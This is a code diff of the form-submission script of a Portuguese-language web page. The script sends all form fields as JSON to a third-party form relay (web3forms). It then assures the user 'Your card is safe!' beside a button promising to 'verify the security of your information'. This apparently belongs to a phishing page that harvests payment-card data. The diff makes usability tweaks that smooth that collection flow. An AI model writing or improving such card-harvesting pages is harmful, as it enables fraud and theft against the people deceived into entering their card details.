@@ -283,7 +283,7 @@
         form.addEventListener('submit', function(e) {
             e.preventDefault(); // Impede o comportamento padrão de recarregar a página
 
-            // --- ALTERAÇÃO NO SCRIPT COMEÇA AQUI ---
+            submitButton.disabled = true; // Desabilita o botão para evitar múltiplos cliques
 
             const formData = new FormData(form);
             const object = {};
@@ -292,9 +292,7 @@
             });
             const json = JSON.stringify(object);
 
-            resultDiv.innerHTML = "Por favor, aguarde...";
-            resultDiv.style.display = "block";
-            resultDiv.classList.remove('error');
+            // Mensagem de "aguarde" foi removida daqui
 
             fetch('https://api.web3forms.com/submit', {
                     method: 'POST',
@@ -307,7 +305,7 @@
                 .then(async (response) => {
                     let jsonResponse = await response.json();
                     if (response.status == 200) {
-                        resultDiv.style.display = 'none'; // Esconde a mensagem de "aguarde"
+                        resultDiv.style.display = 'none'; 
                         successMessage.textContent = "Seu cartão está seguro!";
                         successModal.style.display = 'flex';
                         form.reset();
@@ -317,19 +315,20 @@
                     } else {
                         console.log(response);
                         resultDiv.innerHTML = jsonResponse.message || "Ops! Algo deu errado.";
+                        resultDiv.style.display = "block"; // Mostra a div de resultado apenas se houver erro
                         resultDiv.classList.add('error');
                     }
                 })
                 .catch(error => {
                     console.log(error);
                     resultDiv.innerHTML = "Ops! Algo deu errado. Tente novamente mais tarde.";
+                    resultDiv.style.display = "block"; // Mostra a div de resultado apenas se houver erro
                     resultDiv.classList.add('error');
                 })
                 .finally(() => {
                     submitButton.disabled = false;
                     submitButton.querySelector('span').textContent = 'Clique Aqui pra Verificar a Segurança das suas Informações!';
                 });
-            // --- ALTERAÇÃO NO SCRIPT TERMINA AQUI ---
         });
     </script>
 
